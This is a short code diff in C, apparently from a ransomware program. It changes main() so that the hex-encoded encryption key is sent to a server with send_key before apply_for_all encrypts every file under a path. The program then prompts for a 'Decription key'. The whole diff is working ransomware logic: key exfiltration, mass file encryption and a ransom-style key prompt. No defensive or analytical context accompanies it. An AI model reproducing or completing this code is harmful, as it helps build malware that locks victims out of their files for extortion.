@@ -131,13 +131,13 @@ int main()
     // BIO_dump_fp (stdout, (const char *)key, (int)KEY_SIZE);      // DEBUG
 
     // Send key and IV to server
-
-    // Encrypt
-    apply_for_all(path, &encrypt_file, key, iv);
-
     // Encode in hexa
     encoded_key = encode_hex(key, KEY_SIZE);
     printf("%s\n", encoded_key);
+    send_key(encoded_key);
+
+    // Encrypt
+    apply_for_all(path, &encrypt_file, key, iv);
 
     printf("Decription key :\n");
     scanf("%s", encoded_key);
